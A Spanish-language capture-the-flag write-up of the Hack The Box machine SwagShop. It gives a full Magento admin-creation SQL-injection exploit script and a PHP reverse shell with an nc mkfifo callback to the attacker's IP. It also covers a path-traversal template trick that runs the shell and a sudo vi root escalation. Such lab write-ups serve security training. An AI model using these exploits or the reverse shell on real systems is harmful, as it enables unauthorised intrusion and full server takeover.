---
layout: post
title: HTB_Active
date: 2023/07/10
---

# SwagShop {-}

## Introduccion {-}

La maquina del dia 14/08/2021 se llama SwagShop.

El replay del live se puede ver aqui

[![S4vitaar SwagShop maquina](https://img.youtube.com/vi/Hoionj3rnf8/0.jpg)](https://www.youtube.com/watch?v=Hoionj3rnf8)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.140
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.140
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.140 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.140 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.140
```

Vemos que estamos en frente de una maquina Linux servido por un Apache 2.4.18 con un dominio **swagshop.htb**.
Vemos que hay un error porque la pagina nos redirige automaticamente al dominio y da un error.
Añadimos el dominio a nuestro `/etc/hosts` y volmemos a lanzar el whatweb.

Ahora vemos que estamos en frente de un Magento.

#### Checkear la web del puerto 80 {-}

Con firefox navigamos en la web para ver lo que es. Vemos una web donde se puede comprar productos. Vemos que hay
un panel de busqueda. Intentamos ver si es vulnerable a un html injeccion o un XSS pero no es el caso.

Nos damos cuenta que la URL es `http://swagshop.htb/index.php/`. La ultima bara nos hace pensar que puede ser un directorio.
Vamos a fuzzear la web.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.140/index.php/FUZZ
```

Encontramos unas rutas:

- admin
- catalog
- home
- contacts
- home

Miramos lo que hay en la routa `http://10.10.10.140/index.php/admin`

Checkeamos en la web si existen credenciales por defecto para Magento pero no funcciona. Miramos si existe algo interesante en **exploit-db**

## Vulnerability Assessment {-}

### Checkeando exploit para Magento {-}

```bash
searchsploit magento
```

Vemos un exploit que nos llama la atencion -> Magento eCommerce - Remote Code Execution

Nos copiamos el script en el directorio actual de trabajo y lo analyzamos

```bash
searchsploit -m 37977
mv 37977.py magento_rce.py
vi magento_rce.py
```

Modificamos el script para que funccione

```python
import requests
import base64
import sys

target = "http://10.10.10.140/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds forme:forme".format(target)
else:
    print "DID NOT WORK"
```

Lanzamos el script con el commando `python3 magento_rce.py` y nos dice que el script a funccionado y a creado un usuario forme con la contraseña forme.

Lo miramos desde la web y entramos en Admin panel de Magento.
## Vuln exploit & Gaining Access {-}

### Ganando accesso desde Magento {-}

Para ganar acceso desde un panel Admin de Magento siempre va de la misma forma.

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Desde el panel de configuration de Magento

1. Vamos al menu `System -> Configuration`.
1. En el Menu de izquierda vamos a `ADVANCED -> Developer`
1. En Template Settings Habilitamos los Symlinks y damos al boton `Save Config`
1. En el menu principal, le damos a `catalog -> Manage Categories`

Aqui tenemos que crear una reverse shell `vi shell.php.png`

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

De esta manera, la podemos subir al magento en la parte **Image**, en Name ponemos **test** y damos al boton Save Category
Si hacemos hovering por encima del link de la imagen vemos la routa siguiente

`http://swagshop.htb/media/catalog/category/shell.php.png`

Aqui creamos un nuevo Newsletter Template.

1. En el menu Pricipal damos a `Newsletter -> Newsletter Templates`
1. damos al boton Add Newsletter Template
1. En el formulario le ponemos

    - Template Name: `Test`
    - Template Subject: `Test`
    - Template Content: `{{block type="core/template" template="../media/catalog/category/shell.php.png"}}`

1. le damos al boton Save Template, pinchamos al template creado y le damos a preview template

Aqui no passa nada, lo que quiere decir que la profundida del path traversal no es buena. Intentamos con 2 `../../media` hasta llegar
a la buena profundidad que seria `../../../../../../media/catalog/category/shell.php.png` y hemos ganado acceso a la maquina victima.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay un usuario haris que contiene el **user.txt** y podemos ver la flag## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
```

Vemos que podemos lanzar `/usr/bin/vi` como root sin proporcionar contraseña.

Como con vi se puede settear nuevas variables, es muy facil rootear esta maquina

```bash
sudo -u root vi /var/www/html/EEEEEE
:set_shell=/bin/bash
:shell
```

Ya tenemos una consola como root y podemos visualizar la flag
